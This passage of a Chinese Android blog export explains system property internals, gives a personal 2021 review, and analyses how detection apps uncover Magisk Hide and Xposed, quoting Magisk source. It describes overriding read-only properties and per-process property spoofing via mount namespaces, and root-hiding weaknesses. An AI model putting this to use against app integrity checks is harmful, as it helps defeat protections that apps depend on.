system_properties.Get(name, value);&#125;int SystemProperties::Get(const char* name, char* value) &#123; const prop_info* pi = Find(name); if (pi != nullptr) &#123; return Read(pi, nullptr, value); &#125; else &#123; value[0] = 0; return 0; &#125;&#125;先去调用 Find() 函数找到一个叫做 prop_info* 的东西，然后从里面读出值来。1234567891011const prop_info* SystemProperties::Find(const char* name) &#123; if (!initialized_) &#123; return nullptr; &#125; prop_area* pa = contexts_-&gt;GetPropAreaForName(name); if (!pa) &#123; async_safe_format_log(ANDROID_LOG_WARN, \"libc\", \"Access denied finding property \\\"%s\\\"\", name); return nullptr; &#125; return pa-&gt;find(name);&#125;看到这里你是不是一头雾水，这函数有个 initialized_ 一看就是要初始化的，谁去初始化的？contexts_ prop_area 又是什么？这里就不卖关子了，在 libc.so 被加载的时候，它的 .init.array 段里面的函数会被自动执行，而有 __attribute__((constructor(1)) 的函数就会被放到 .init.array 段从而被自动执行。里面兜兜转转，会调用一个 __system_properties_init() 函数，而这个函数正是初始化上面这些东西的关键所在。123456789101112131415161718192021222324252627282930#define PROP_FILENAME \"/dev/__properties__\"int __system_properties_init() &#123; return system_properties.Init(PROP_FILENAME) ? 0 : -1;&#125;bool SystemProperties::Init(const char* filename) &#123; // This is called from __libc_init_common, and should leave errno at 0 (http://b/37248982). // ... strcpy(property_filename_, filename); if (is_dir(property_filename_)) &#123; if (access(\"/dev/__properties__/property_info\", R_OK) == 0) &#123; contexts_ = new (contexts_data_) ContextsSerialized(); if (!contexts_-&gt;Initialize(false, property_filename_, nullptr)) &#123; return false; &#125; &#125; else &#123; contexts_ = new (contexts_data_) ContextsSplit(); if (!contexts_-&gt;Initialize(false, property_filename_, nullptr)) &#123; return false; &#125; &#125; &#125; else &#123; contexts_ = new (contexts_data_) ContextsPreSplit(); if (!contexts_-&gt;Initialize(false, property_filename_, nullptr)) &#123; return false; &#125; &#125; initialized_ = true; return true;&#125;名词越来越多了……先别急着头晕，聪明的你肯定发现，这里出现了两个文件路径：/dev/__properties__ 和 /dev/__properties__/property_info。连上手机 ls 一下看看：12345678vince:&#x2F; # ls -lZ &#x2F;dev&#x2F;__properties__total 1376-r--r--r-- 1 root root u:object_r:properties_serial:s0 131072 1970-07-08 15:56 properties_serial-r--r--r-- 1 root root u:object_r:property_info:s0 62540 1970-07-08 15:56 property_info-r--r--r-- 1 root root u:object_r:aac_drc_prop:s0 131072 1970-07-08 15:56 u:object_r:aac_drc_prop:s0-r--r--r-- 1 root root u:object_r:aaudio_config_prop:s0 131072 1970-07-08 15:56 u:object_r:aaudio_config_prop:s0-r--r--r-- 1 root root u:object_r:ab_update_gki_prop:s0 131072 1970-07-08 15:56 u:object_r:ab_update_gki_prop:s0-r--r--r-- 1 root root u:object_r:adbd_config_prop:s0 131072 1970-07-08 15:56 u:object_r:adbd_config_prop:s0而查看 /dev/__properties__/property_info 这个文件是一堆二进制数据。细心的你可能已经发现了我们上面的 u:object_r:adbd_config_prop:s0 这些奇怪的文件名，同时还有 release_or_codename、dex2oat-flags 这些我们用过的属性的名字的一段（以点分割）。点开 ContextsSerialized 里面是一些字典树之类的无趣的数据结构内容；而我们要明白它们的作用，其实可以看看没有这个文件时（如低版本系统）用的 ContextsSplit 的作用：1234567891011121314151617bool ContextsSplit::InitializeProperties() &#123; // Use property_contexts from /system &amp; /vendor, fall back to those from / if (access(\"/system/etc/selinux/plat_property_contexts\", R_OK) != -1) &#123; if (!InitializePropertiesFromFile(\"/system/etc/selinux/plat_property_contexts\")) &#123; return false; &#125; if (access(\"/vendor/etc/selinux/vendor_property_contexts\", R_OK) != -1) &#123; InitializePropertiesFromFile(\"/vendor/etc/selinux/vendor_property_contexts\"); &#125; else &#123; // Fallback to nonplat_* if vendor_* doesn't exist InitializePropertiesFromFile(\"/vendor/etc/selinux/nonplat_property_contexts\"); &#125; &#125; else &#123; // ... 省略 其他文件路径 &#125; return true;&#125;找一部手机，看看 /system/etc/selinux/plat_property_contexts 是什么：123456789101112131415#line 1 &quot;system&#x2F;sepolicy&#x2F;private&#x2F;property_contexts&quot;########################### property service keys##net.rmnet u:object_r:net_radio_prop:s0# ...net. u:object_r:system_prop:s0dev. u:object_r:system_prop:s0ro.runtime. u:object_r:system_prop:s0ro.runtime.firstboot u:object_r:firstboot_prop:s0hw. u:object_r:system_prop:s0ro.hw. u:object_r:system_prop:s0sys. u:object_r:system_prop:s0# ...左边的 ro. net. 很明显是属性的前缀，右边的 u:object_r:system_prop:s0 不是刚好对应我们上面看到的文件名吗？找一个文件 cat 一下，没错，属性的名字和值都在里面。而实际上，上面的 prop_area 也是根据属性名搜索到对应的文件位置然后将它 mmap 到内存中获得的。而我们再回头看看这个文件名，是不是很熟悉？如果你有了解过 SELinux 这一 Android 安全模型的重要组成部分，你很容易就会发现这个文件名就是 SELinux 中所谓的 Context 的格式。而再回头看上面 ls -Z 的输出，你会发现里面所有名字是这个格式的文件，它们的名字和“SELinux 上下文”都一样。自此，我们得到了第一个结论：Android 系统按照 Context 将属性们分为一个个“组”，获取属性值时，首先通过名字查询到这个属性所在的组，然后再在对应的文件里面查询。Property Area回到我们刚刚的 SystemProperties::Find() 这个函数里，它拿到对应的 prop_area 也就是所谓的“属性组”之后，又调用了它的 find() 函数在里面搜索，点开看看：12345678910111213141516171819202122232425262728293031323334353637383940414243const char* remaining_name = name;prop_bt* current = trie;while (true) &#123; const char* sep = strchr(remaining_name, '.'); const bool want_subtree = (sep != nullptr); const uint32_t substr_size = (want_subtree) ? sep - remaining_name : strlen(remaining_name); if (!substr_size) &#123; return nullptr; &#125; prop_bt* root = nullptr; uint_least32_t children_offset = atomic_load_explicit(&amp;current-&gt;children, memory_order_relaxed); if (children_offset != 0) &#123; root = to_prop_bt(&amp;current-&gt;children); &#125; else if (alloc_if_needed) &#123; uint_least32_t new_offset; root = new_prop_bt(remaining_name, substr_size, &amp;new_offset); if (root) &#123; atomic_store_explicit(&amp;current-&gt;children, new_offset, memory_order_release); &#125; &#125; if (!root) &#123; return nullptr; &#125; current = find_prop_bt(root, remaining_name, substr_size, alloc_if_needed); if (!current) &#123; return nullptr; &#125; if (!want_subtree) break; remaining_name = sep + 1;&#125;uint_least32_t prop_offset = atomic_load_explicit(&amp;current-&gt;prop, memory_order_relaxed);if (prop_offset != 0) &#123; return to_prop_info(&amp;current-&gt;prop);&#125; else if (alloc_if_needed) &#123; uint_least32_t new_offset; prop_info* new_info = new_prop_info(name, namelen, value, valuelen, &amp;new_offset); if (new_info) &#123; atomic_store_explicit(&amp;current-&gt;prop, new_offset, memory_order_release); &#125; return new_info;&#125; else &#123; return nullptr;&#125;prop_bt prop_info 又是什么？这一堆什么 subtree left right 看着就像一棵树，它的结构是什么样的呢，其实注释里已经写了：1234567891011121314&#x2F;&#x2F; Properties are stored in a hybrid trie&#x2F;binary tree structure.&#x2F;&#x2F; Each property&#39;s name is delimited at &#39;.&#39; characters, and the tokens are put&#x2F;&#x2F; into a trie structure. Siblings at each level of the trie are stored in a&#x2F;&#x2F; binary tree. For instance, &quot;ro.secure&quot;&#x3D;&quot;1&quot; could be stored as follows:&#x2F;&#x2F;&#x2F;&#x2F; +-----+ children +----+ children +--------+&#x2F;&#x2F; | |--------------&gt;| ro |--------------&gt;| secure |&#x2F;&#x2F; +-----+ +----+ +--------+&#x2F;&#x2F; &#x2F; \\ &#x2F; |&#x2F;&#x2F; left &#x2F; \\ right left &#x2F; | prop +&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x2F;&#x2F; v v v +--------&gt;| ro.secure |&#x2F;&#x2F; +-----+ +-----+ +-----+ +-----------+&#x2F;&#x2F; | net | | sys | | com | | 1 |&#x2F;&#x2F; +-----+ +-----+ +-----+ +&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+这是一颗二叉树和字典树的混血儿。在传统的二叉树结构中，假如一个节点 node 拥有 left right 两个成员：node { var left, right }，其中的 left right 都是 node 这个节点的孩子；在传统二叉树的搜索中，如果给定一个 key，那么流程大概会是这样的伪代码：123456789while (currentNode != null) &#123; if (key &lt; currentNode.key) currentNode = currentNode.left else if (key &gt; currentNode.key) currentNode = currentNode.right else // key == currentNode.key return currentNode&#125;return null而在这个混合结构中，节点 node 的 left right 和 node 本身其实是平级关系，它们的父节点是同一个，child 才是节点的子节点。而理解了这一点之后，要看懂上面这幅图也就不难了。还是以 ro.secure=1 来举例。首先对属性名 ro.secure 以点分割，得 ro 和 secure，先从树上查找到 ro，而 ro 的左右节点 sys 和 net 与 ro 是平级关系。接着，从 ro 的 child 指向的节点里查找 secure，很明显第一个就是。找到了之后，根据节点的 prop 值指向的一个 prop_info 结构就能读取到值。因此 prop_bt 其实只是用来树上的一个个节点，而它指向的 prop_info 才是真正存放属性值的地方。属性区域的初始化我们还有一个问题：我们上面的操作都是在 /dev/__properties__ 这个文件夹下面玩的，那这个文件夹和里面的文件是哪来的呀？其实早在 init 进程启动时，它就调用了 PropertyInit() 初始化12345678910111213141516171819void PropertyInit() &#123; mkdir(\"/dev/__properties__\", S_IRWXU | S_IXGRP | S_IXOTH); CreateSerializedPropertyInfo(); if (__system_property_area_init()) &#123; LOG(FATAL) &lt;&lt; \"Failed to initialize property area\"; &#125; if (!property_info_area.LoadDefaultPath()) &#123; LOG(FATAL) &lt;&lt; \"Failed to load serialized property info file\"; &#125; // If arguments are passed both on the command line and in DT, // properties set in DT always have priority over the command-line ones. ProcessKernelDt(); ProcessKernelCmdline(); ProcessBootconfig(); // Propagate the kernel variables to internal variables // used by init as well as the current required properties. ExportKernelBootProps(); PropertyLoadBootDefaults();&#125;这个函数先是创建了 /dev/__properties__ 随后将 split context 的一堆文件“编译”成二进制树的形式并序列化到 property_info 中以加速其他进程的启动速度，而后将内核命令行、default.prop、build.prop 等的内容加载进来，然后我们的属性区域就有值了！再往后看，init 进程还会调用一个 StartPropertyService() 的东西，这个 property service 又是什么呢，这里我就不放源码了，它建立了一个 Socket Server，__system_properties_set() 时就会去通过 socket 连上它，然后这个 property service 再进行实际的写入。我们上面提到的鉴权的问题，也已经有了答案：对于获取属性，因为每个属性都有对应的 context，进程如果权限不够，尝试打开这个 context 对应文件时就会被 SELinux 直接挡住；而对于写入属性，其他进程尝试写入属性实际都是通过 socket 连上运行在 init 的一个 service，由这个 service 来做鉴权、阻止只读属性被覆盖的检查以及最终的写入操作。其实到这里，属性系统还有很多内容没有介绍，比如 long value、persist props 这些东西，但由于篇幅限制，只能到这里了，有兴趣的同学可以自己查阅源代码哦 :)魔法时刻绕过 ro 属性的只读限制上面提到，ro 属性的检查是在 init 进程手动做的，那如果我们直接操作对应内存，是不是就能绕开这个限制呢？事实上，由于这些文件的权限以及 SELinux 相关限制，在 init 进程以外你在正常的 Android 系统里几乎没办法写入这些文件；但如果你的进程有足够高的权限，这是可行的！事实上，Magisk 的 resetprop 就是这么实现的，你甚至还可以做到更神奇的事，比如删除属性！属性的“隔离”操作什么是“隔离”？通常来说，就是 14+7（我们想要的“隔离”效果大概就是，两个进程在同一时刻对同一个属性获取到不同的值。Android 系统原生是不支持这种操作的，但是我们可以使用黑魔法来完成这一点。在 Linux 中，有一个概念叫做 namespace，它就是一种资源隔离方案。在它可以隔离的资源中，有一种东西，叫 mount。什么概念：简单点说，如果两个进程拥有不一样的 mount namespace，进程 A 搞破坏把 /data 给 mount 到了 /system，但是这一切进程 B 是看不见的，它所看见的 /system 还是原来那个。结合我们上面提到的，属性其实是存在一堆“一次性”文件里的这一点，我们有了一个大胆的想法：首先 unshare 分离 namespace，把某个 context 对应的文件给复制一份，然后把这个复制品 bind mount 到原来的文件，直接修改这个复制品里的属性值，就能实现只让一个进程看见对应属性的修改！我们还可以改变一下，实现一个可以回滚的 resetprop：在 zygote 启动之前和 init 同命名空间的某个高权限进程里把复制品 bind mount 回原文件，然后修改里面的内容，之后启动的任何进程（包括 zygote）都会看见被修改后的属性；然后在需要回滚修改的 app 进程里 unmount 这些文件，随后因为有些文件可能已经在 zygote 里被提前 mmap 过了，我们需要把它们 unmap 再重新 mmap 以确保 app 读到的永远是未被修改的真实值，然后我们就实现了属性修改的回滚！我已经在自己的 Magisk fork 上进行了简单测试，确认可行，源码在这里：https://github.com/canyie/Magisk/commit/d50a060a23727236b36d79afc696632519247fd8当然这个方法有一些小小缺陷，比如我们 hijack 一个 context 后所有归属于这个 context 的其他属性都会受到影响，之后的 setprop 只会对进行了回滚的进程生效，因为 init 已经打开了所有文件，只会对原文件进行写入操作。这个问题可以通过 inotify 监听写入然后手动更新解决，但是是体力活。但是，我们的确发明了我们自己的魔法！至于这个好玩的新东西能做什么，可以发挥你的想象力 :)","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"property","slug":"property","permalink":"https://blog.canyie.top/tags/property/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://blog.canyie.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"从电子厂逃离的 17 岁 - 2021 年终总结","slug":"end-of-2021","date":"2022-01-09T06:19:46.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2022/01/09/end-of-2021/","link":"","permalink":"https://blog.canyie.top/2022/01/09/end-of-2021/","excerpt":"当我写下这段文字时，时间是 2022 年 1 月 9 日，这个时候发上一年年终总结似乎晚了点；老实说，在这个博客刚创建的时候，我没有打算写这种记录性的内容，我的目标一直都是像 Weishu’s Notes 的高质量内容；但是昨晚看 weishu 直播写代码，他说了一句让我很触动的话：“人生不需要有意义，有意思就够了。”我的 2021 可能没什么意义，但如果我不做点什么纪念一下，它很有可能就消逝在时间的长河里，连我自己都回忆不起来，更别提有意思了。","text":"当我写下这段文字时，时间是 2022 年 1 月 9 日，这个时候发上一年年终总结似乎晚了点；老实说，在这个博客刚创建的时候，我没有打算写这种记录性的内容，我的目标一直都是像 Weishu’s Notes 的高质量内容；但是昨晚看 weishu 直播写代码，他说了一句让我很触动的话：“人生不需要有意义，有意思就够了。”我的 2021 可能没什么意义，但如果我不做点什么纪念一下，它很有可能就消逝在时间的长河里，连我自己都回忆不起来，更别提有意思了。计算机：LSPosed 与向 Magisk 提交 PR2021 年开头，发生了一件大家可能都知道的事情：shana 姐姐希望给 EdXposed 做出较大修改，如强制白名单作用域等，但 MlgmXyysd 姐姐不同意，认为应该保持与原版 Xposed 的一致性，吵过几次之后，shana 姐姐宣布分道扬镳，创建 LSPosed 还带走了 ksm。最初版的 LSPosed 就是一个强制启用了作用域版的 EdXposed，但仅仅如此就有大量用户表示获得了巨大的性能提升。以后的日子里，他们重构了整个项目，带来了基于 binder 的后端服务，修复了一大堆 bug 还添加了新的 API。当然这一切都与我没什么关系，我自己几乎一行代码没给 LSPosed 写过，也就是几个 art 有关的 bug 和一起他们讨论出修复方法，说白了就是打个酱油——惊喜的是，我竟然获得了 owner ！而且和一群志同道合的哥哥姐姐们互相交流技术一起写代码真的很开心！！学会了很多我自己可能一辈子也学不到的东西！！如今，LSPosed 已经是国内外最受欢迎的 Xposed 实现，也算是完成了自己以前的一个小心愿吧~在 LSPosed 刚开始的时候，我们就一直收到用户反馈安装后手机无法开机，获取到 log 后发现是 Magisk 挂载系统文件时到一半突然卡住，从 log 里完全看不出原因。更奇怪的是，我们添加了一些 log 构建出自己的 debug 版本发给用户测试后，竟然可以开机了！！百思不得其解之际，内群里另一位开发者的 magisk 卡住了，而且她的 sui 可以在 magisk su 不可用时获取到 root 权限帮助调试。用 lldb 折腾了两天之后，我们终于搞清楚她的问题出在哪里：log 里调用的 localtime_r 里面有一把不可重入的锁，加锁之后刚好收到一个 signal，程序直接转跳到 signal handler 执行，signal handler 打印 log 又要再次调用 localtime_r，里面又尝试获取自己已经加过的锁，然后直接死锁。理论上讲，它确实可以造成之前的问题，等到 magisk 把这个 bug 修复之后，我们以为万事大吉了。然而事实是，我们仍然继续收到相关反馈。几个月后，我们终于找到了一位可以稳定复现该问题的用户，最后发现了这个 bug 的本质：magisk 使用了一个没有初始化的变量，它可能是随机值。提交修复之后，整个内群都在发这么一句话：这是我们第一次和 magisk bug 打交道。之后，我偶然发现我的备用手机红米 5 Plus 上 magisk hide 完全不工作，一开始我以为是我刷的 lineageos 的原因，但后来我在我的 Pixel 3 上也开始随机遇到这个问题，而且不断有人向我反馈 MomoHider 工作不正常，调查后发现是 magisk hide 坏了。某一天我静下心来，把那台备用机开机，连上电脑，一遍遍回看相关逻辑一点点改代码，最后被我一行代码修好了。然后我向 magisk 提交了我自己的第一个 PR，很可惜的是因为 magisk 后来删除了 magisk hide，我的 PR 没有被合并。往后的日子里，我们给 Magisk 提交了多次代码，修复了多个 bug。在之前我绝对想不到在全世界范围里获得数亿使用的 Magisk 会有这么多 bug，也很开心自己能参与一个这么大的项目，希望自己在新的一年里学到更多，最好拿到 collaborator （学习：中职日常寒假结束回到学校之后，我被发下来的课程表震惊了：我们的专业名叫计算机网络技术，但是第二学期把这门专业课给取消了，然后加了什么 常用工具软件（教你怎么用 QQ 怎么用美图秀秀怎么用酷狗音乐腾讯视频）还有 Photoshop。去问学校这是怎么回事，得到的答复是，学生们反映这门课太难听不懂就取消了。无语至极，也只能一边上着荒唐至极的课，一边自学准备高职高考。幸运的是，能在这里碰到一起编程一起学习一起高考的伙伴。三个月电子厂实习也结束了，希望自己新的一年能全力备战高考~实习：被推向电子厂的三个月六月份听说计算机等级考试九月份开始报名，十一点一到直接在课堂上拿出电脑报名。现在想来庆幸当时的自己的果断，韶大考点名额很少被自己抢到了一个，过了一天再去看只剩下松山学院可以报了~ 但是，直到期末我们才被通知，下个学期一开始就要去实习三个月。度过了一个暑假，开学了，学校果然没骗我，待了三天就直接坐着大巴去了几百公里外的城市。说是实习，其实也就是让学生去电子厂干些正常人都会干的活。在厂里上班三个月，我的感受就是这不是人干的活：程序员天天抱怨的996在那里根本就不是问题，我最晚一次早上八点上班上到晚上十点半，连晚饭都没吃；几乎没有假放，中秋的一天还是调休调出来的，国庆只有三天回趟家几乎在睡觉中度过；第一个月还好，第二个月开始上夜班两班倒，到后面基本上就是麻木的在那里干活，脑子放空手上还在机械的做那些动作，感觉时间流速都不一样了，活还在手上干着外面天已经亮了；回来基本上手机拿在手里没充电坐在床上就直接睡着了。三个月下来，拿到手工资不到一万，还把之前的基础几乎忘完了，到实习结束写实习报告的时候连字都不会写。但好在，这三个月我已经熬过来了。现在只希望自己能好好自学，参加高职高考能考上好的大学，否则按国内这个环境，我会再难的东西也是去电子厂的命。在知乎上看见一个立志要考上深职院的学姐，真的很励志呀，希望自己也能怎么努力~附上链接：中职生高职高考自学，感觉找不到好的方法学习方法，该怎么办？ - 话梅的回答 - 知乎在故事结束之后的故事回来学校之后，很迷茫，似乎又回到了以前在学校那种状态，上完六节课就在课室或者宿舍躺着，送的试卷也没动力去翻一下。昨天晚上看 weishu 直播修 bug，猛然又想起当时的梦想，当时的梦多么天真多么美好啊，那就让我们去实现它吧~ 我不是一个有恒心的人，所以如果你愿意的话，请监督我吧，希望我们能在美好的未来相见~~","categories":[],"tags":[{"name":"年鉴","slug":"年鉴","permalink":"https://blog.canyie.top/tags/%E5%B9%B4%E9%89%B4/"},{"name":"闲聊","slug":"闲聊","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"检测Magisk与Xposed","slug":"anti-magisk-xposed","date":"2021-05-01T05:23:44.000Z","updated":"2025-04-24T10:33:02.812Z","comments":true,"path":"2021/05/01/anti-magisk-xposed/","link":"","permalink":"https://blog.canyie.top/2021/05/01/anti-magisk-xposed/","excerpt":"不久前，开发者Rikka &amp; vvb2060上架了一款环境检测应用Momo，把大家一直以来信任的各种反检测手段击得粉碎。下面我会通过部分已公开的源码，分析这个可能是史上最强的环境检测应用。","text":"不久前，开发者Rikka &amp; vvb2060上架了一款环境检测应用Momo，把大家一直以来信任的各种反检测手段击得粉碎。下面我会通过部分已公开的源码，分析这个可能是史上最强的环境检测应用。检测 Magisk这一部分只分析有趣的东西，关于MagiskDetector的其他一些具体实现细节请直接查看 https://github.com/vvb2060/MagiskDetector/blob/master/README_ZH.md反Magisk Hide首先分析Magisk Hide的原理：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980static void new_zygote(int pid) &#123; struct stat st; if (read_ns(pid, &amp;st)) return; auto it = zygote_map.find(pid); if (it != zygote_map.end()) &#123; // Update namespace info it-&gt;second = st; return; &#125; LOGD(\"proc_monitor: ptrace zygote PID=[%d]\\n\", pid); zygote_map[pid] = st; xptrace(PTRACE_ATTACH, pid); waitpid(pid, nullptr, __WALL | __WNOTHREAD); xptrace(PTRACE_SETOPTIONS, pid, nullptr, PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK | PTRACE_O_TRACEEXIT); xptrace(PTRACE_CONT, pid);&#125;void proc_monitor() &#123; // 省略... // First try find existing zygotes check_zygote(); for (int status;;) &#123; const int pid = waitpid(-1, &amp;status, __WALL | __WNOTHREAD); if (pid &lt; 0) &#123; // 省略... &#125; if (!WIFSTOPPED(status) /* Ignore if not ptrace-stop */) DETACH_AND_CONT; int event = WEVENT(status); int signal = WSTOPSIG(status); if (signal == SIGTRAP &amp;&amp; event) &#123; unsigned long msg; xptrace(PTRACE_GETEVENTMSG, pid, nullptr, &amp;msg); if (zygote_map.count(pid)) &#123; // Zygote event switch (event) &#123; case PTRACE_EVENT_FORK: case PTRACE_EVENT_VFORK: PTRACE_LOG(\"zygote forked: [%lu]\\n\", msg); attaches[msg] = true; break; // ... &#125; &#125; else &#123; switch (event) &#123; case PTRACE_EVENT_CLONE: PTRACE_LOG(\"create new threads: [%lu]\\n\", msg); if (attaches[pid] &amp;&amp; check_pid(pid)) // 这里就会实际hide magisk continue; break; // ... &#125; &#125; xptrace(PTRACE_CONT, pid); &#125; else if (signal == SIGSTOP) &#123; if (!attaches[pid]) &#123; // Double check if this is actually a process attaches[pid] = is_process(pid); &#125; if (attaches[pid]) &#123; // This is a process, continue monitoring PTRACE_LOG(\"SIGSTOP from child\\n\"); xptrace(PTRACE_SETOPTIONS, pid, nullptr, PTRACE_O_TRACECLONE | PTRACE_O_TRACEEXEC | PTRACE_O_TRACEEXIT); xptrace(PTRACE_CONT, pid); &#125; // ... &#125; // ... &#125;&#125;可以看见，magisk hide通过ptrace机制跟踪所有zygote，通过cat /proc/&lt;pid&gt;/status看见TracerPid也可以证实我们的发现。子进程的第一个线程创建时，对其实际进行hide。123456789101112131415161718192021222324252627282930313233343536373839404142434445static bool check_pid(int pid) &#123; char path[128]; char cmdline[1024]; struct stat st; sprintf(path, \"/proc/%d/cmdline\", pid); if (auto f = open_file(path, \"re\")) &#123; fgets(cmdline, sizeof(cmdline), f.get()); &#125; else &#123; // Process died unexpectedly, ignore detach_pid(pid); return true; &#125; if (cmdline == \"zygote\"sv || cmdline == \"zygote32\"sv || cmdline == \"zygote64\"sv || cmdline == \"usap32\"sv || cmdline == \"usap64\"sv) return false; // 通过uid和进程名判断是否需要hide if (!is_hide_target(uid, cmdline)) goto not_target; // 如果命名空间未分离，进行unmount会影响到zygote从而影响到而后启动的所有进程，跳过 read_ns(pid, &amp;st); for (auto &amp;zit : zygote_map) &#123; if (zit.second.st_ino == st.st_ino &amp;&amp; zit.second.st_dev == st.st_dev) &#123; // ns not separated, abort LOGW(\"proc_monitor: skip [%s] PID=[%d] UID=[%d]\\n\", cmdline, pid, uid); goto not_target; &#125; &#125; // Detach but the process should still remain stopped // The hide daemon will resume the process after hiding it LOGI(\"proc_monitor: [%s] PID=[%d] UID=[%d]\\n\", cmdline, pid, uid); detach_pid(pid, SIGSTOP); hide_daemon(pid); return true;not_target: PTRACE_LOG(\"[%s] is not our target\\n\", cmdline); detach_pid(pid); return true;&#125;hide_daemon里会fork一个新的进程，setns到目标进程的命名空间，然后卸载所有被magisk修改过的东西。注意，里面有个if判断，如果命名空间未分离，进行unmount会影响到zygote从而影响到而后启动的所有进程，那么直接跳过。这就是Magisk Hide的第一个问题。在MagiskDetector的实现细节介绍里说明了有两种情况符合：一个是应用appops的读取存储空间op为忽略，一个是该进程为隔离进程。此处的隔离进程指的就是配置了 android:isolatedProcess=&quot;true&quot;的service。而且，Android 10上还有一种有（私）趣（货）的东西，叫做App Zygote，这玩意几乎找不到说明，唯一的文档就是ZygotePreload，感觉更像谷歌给Chrome开的后门。咳咳，偏题了，这玩意运行在一个单独的进程，也不会分离命名空间。目前已知解决此问题的方案有两种，第一种就是Magisk Lite，直接对zygote卸载而非应用，但这种方式会破坏很多现有模块；另一种就是利用进程注入，强行分离命名空间，典型的解决方案是Riru-Unshare。好的，这个问题说完了，下一个~~在上面的判断代码里，读取进程名部分，是通过读取/proc/&lt;pid&gt;/cmdline进行判断的；而实际上，这个文件内容的长度是有限制的！这表示，当配置的进程名过长时，Magisk读取到的进程名会不匹配，从而跳过这个进程！这也就是Issue #3997的原理。Magisk对此做了临时修复：如果前缀匹配就直接认为是目标进程进行hide。完了吗？没有。下一个问题在把进程添加到数据库的时候：123456789101112131415161718192021222324252627static int add_list(const char *pkg, const char *proc) &#123; if (proc[0] == '\\0') proc = pkg; if (!validate(pkg) || !validate(proc)) return HIDE_INVALID_PKG; // ...&#125;static bool validate(const char *s) &#123; if (strcmp(s, ISOLATED_MAGIC) == 0) return true; bool dot = false; for (char c; (c = *s); ++s) &#123; if ((c &gt;= 'A' &amp;&amp; c &lt;= 'Z') || (c &gt;= 'a' &amp;&amp; c &lt;= 'z') || (c &gt;= '0' &amp;&amp; c &lt;= '9') || c == '_' || c == ':') &#123; continue; &#125; if (c == '.') &#123; dot = true; continue; &#125; return false; &#125; return dot;&#125;这里会对包名和进程名进行检查，如果含有非法字符或者没有点，那么认为是无效进程。Android对包名有严格规定，通过android:process配置的进程名也有规定，似乎无法作妖？然而问题确实发生了：Issue #4176。经过检查，该应用程序使用了隔离进程来检查Magisk，但不同的是，其服务类名含有非法字符（Java并没有限制类名），且Android 10+，系统会给隔离进程的名字追加类名（https://t.me/vvb2060Channel/441），导致检查不通过。解决方法也很简单，修改一下这个validate就好。检测init.rc的修改：随机只有在无法遍历的情况下才有效。如果可以遍历，使用统计方法即可准确找出每次都不一样的东西。这句话看着有点迷惑，看看Magisk源码就知道了。https://github.com/topjohnwu/Magisk/blob/master/native/jni/init/rootdir.cpp#L45：1234567// Inject Magisk rc scriptschar pfd_svc[16], ls_svc[16], bc_svc[16];gen_rand_str(pfd_svc, sizeof(pfd_svc));gen_rand_str(ls_svc, sizeof(ls_svc));gen_rand_str(bc_svc, sizeof(bc_svc));LOGD(\"Inject magisk services: [%s] [%s] [%s]\\n\", pfd_svc, ls_svc, bc_svc);fprintf(rc, MAGISK_RC, tmp_dir, pfd_svc, ls_svc, bc_svc);Magisk在启动时会往init.rc中注入三个自己的服务，用来接收post-fs-data等事件；这三个服务的名称是做了随机化处理，而init实际上会往系统属性里添加像init.svc.&lt;service name&gt;这样子的属性，值是running或者stopped，以告诉其他进程该服务的状态。MagiskDetector就利用了这个机制，遍历系统属性记录所有服务名，然后在用户重启之后就能知道是否有服务的名称发生了变化。检测SELinux规则https://github.com/topjohnwu/Magisk/blob/master/native/jni/magiskpolicy/rules.cpp12345678910111213141516// Allow these processes to access MagiskSUconst char *clients[] &#123; \"init\", \"shell\", \"appdomain\", \"zygote\" &#125;;for (auto type : clients) &#123; if (!exists(type)) continue; allow(type, SEPOL_PROC_DOMAIN, \"unix_stream_socket\", \"connectto\"); allow(type, SEPOL_PROC_DOMAIN, \"unix_stream_socket\", \"getopt\"); // Allow termios ioctl const char *pts[] &#123; \"devpts\", \"untrusted_app_devpts\" &#125;; for (auto pts_type : pts) &#123; allow(type, pts_type, \"chr_file\", \"ioctl\"); if (db-&gt;policyvers &gt;= POLICYDB_VERSION_XPERMS_IOCTL) allowxperm(type, pts_type, \"chr_file\", \"0x5400-0x54FF\"); &#125;&#125;由于Magisk允许了一些ioctl，所以会被检测到。解决方法是，更新到Android 8+ &amp; Magisk 21+，Magisk会自动使用新的规则。同时，不仅仅是Magisk自身的锅，错误使用SELinux也可能会造成Magisk被轻易检测到。举例：12type(SEPOL_PROC_DOMAIN, \"domain\");type(SEPOL_FILE_TYPE, \"file_type\");加了两个magisk自己的domain，看起来没问题，但是，如果用户把selinux设置为宽容模式（permissive），那么app可以进行selinux_check_access()（java层对应的接口为SELinux.checkSELinuxAccess()），如果获得允许，那么代表这个domain存在 =&gt; 安装了Magisk。不只是宽容模式，如果添加了allow appdomain xxx relabelfrom之类的规则，又没有deny appdomain magisk_file relabelto，则app可能把某个文件的context给chcon成magisk_file，然后通过尝试操作这个文件判断有没有被拒绝就可以测试出系统中有没有这个domain。SELinux是Android安全机制中的重要组成部分，强烈反对将其设置为宽容模式或忽略neverallow随意添加规则。题外话：检测 magiskd虽然 MagiskDetector 没有使用这个方法，但觉得有点意思，可以拿出来讲一讲。Android 7之前，/proc没有限制，任何人都能遍历获得进程列表；在7的时候，加了hidepid=2，但并不是所有厂商都跟上了；对于这些设备，扫一下看看有没有个叫magiskd的进程就能确定有没有magisk。Xposed检测 Xposed原版 Xposed 框架将自己的类加入到bootclasspath中，这导致任何人都能轻易找到。之后，大家都选择把 classloader 隔离开来，让检测没有那么容易；但是，只要它存在于内存中，那就可以被找到。XposedDetector的原理很简单，通过art的一个内部接口（VisitRoots），找到堆里的所有ClassLoader，然后一个一个尝试。目前lsp、edxp、梦境等都选择只在目标应用加载，以阻止误伤。把这个函数hook了当然可以，但我们并不想玩这种猫鼠游戏，只能保证非目标应用的环境不被修改。反 Xposed 